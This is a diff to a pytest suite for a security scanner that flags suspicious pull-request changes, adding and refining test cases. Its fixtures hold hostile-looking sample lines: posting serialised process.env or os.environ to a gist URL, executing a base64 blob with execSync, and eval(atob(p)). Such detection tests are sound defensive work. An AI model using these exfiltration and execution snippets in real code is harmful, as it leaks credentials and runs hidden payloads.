@@ -389,7 +389,8 @@ def test_encoded_payload_in_artifact_and_executed_combos():
 
 def test_credential_exfiltration_combo():
     ids = _scan_ids(
-        [_file("a.js", _added("process.env)", "post('https://gist.githubusercontent.com/x')"))]
+        [_file("a.js", _added("const e = JSON.stringify(process.env)",
+                              "post('https://gist.githubusercontent.com/x')"))]
     )
     assert "combo.credential_exfiltration" in ids
 
@@ -735,7 +736,7 @@ def test_total_score_is_never_below_the_evidence_score():
             [
                 _file("a.js", _added(f'const b = "{B64}";', "execSync(b)",
                                      "post('https://gist.githubusercontent.com/x')",
-                                     "process.env)")),
+                                     "send(JSON.stringify(process.env))")),
                 _file("blob.bin", change_type="added", is_binary=True),
             ],
             source="pr", author="alice", merged_by="alice",
@@ -1322,3 +1323,45 @@ def test_a_source_map_is_derived_and_not_scanned():
     line = '{"version":3,"sourcesContent":["for (let i = 0; i < Infinity; i++) {}"]}'
     found = rules.scan(_change([_file("dist/index.cjs.map", _added(line), change_type="added")]))
     assert "content.unbounded_loop" not in _ids(found)
+
+
+# ---------------------------------------------------------------- round 2, wider window
+# Found by re-hunting the round-2 targets 50 commits deep instead of 10.
+
+
+@pytest.mark.parametrize("line, fires", [
+    ('module.exports = eval("require")("@actions/core");', False),  # FranzDiebold, 2020
+    ("const r = eval('require');", False),
+    ("eval(code)", True),
+    ("eval('a' + b)", True),
+    ("eval(atob(p))", True),
+])
+def test_eval_of_a_quoted_name_is_a_lookup_not_code(line, fires):
+    assert ("content.shell_exec" in _scan_ids([_file("dist/index.js", _added(line))])) is fires
+
+
+def test_an_office_document_is_data_not_an_opaque_binary():
+    # shelfio/aws-lambda-libreoffice: test inputs for a document converter.
+    found = rules.scan(_change([_file("test/test-data/doc.docx", change_type="added",
+                                      is_binary=True)]))
+    assert "content.asset_added" in _ids(found) and not rules.should_escalate(found)
+
+
+def test_an_inline_source_map_is_not_an_encoded_payload():
+    # ravsamhq/notify-slack-action: tsc's inline map in a committed dist/ file.
+    import base64
+    payload = base64.b64encode(b'{"version":3,"file":"main.js","sources":["x"]' + b" " * 200)
+    line = "//# sourceMappingURL=data:application/json;base64," + payload.decode()
+    found = rules.scan(_change([_file("dist/index.js", _added(line))]))
+    assert "content.encoded_blob" not in _ids(found) and not rules.should_escalate(found)
+
+
+@pytest.mark.parametrize("line, fires", [
+    ("const { CI } = normalizeEnv(process.env)", False),     # Hotell, 2019: CI detection
+    ("const token = JSON.stringify(process.env.TOKEN)", False),  # one variable
+    ("https.request(opts).write(JSON.stringify(process.env))", True),
+    ("axios.post(url, process.env)", True),
+    ("requests.post(URL, json=dict(os.environ))", True),
+])
+def test_the_environment_counts_as_collected_only_when_it_reaches_a_sink(line, fires):
+    assert ("content.secret_access" in _scan_ids([_file("src/a.js", _added(line))])) is fires
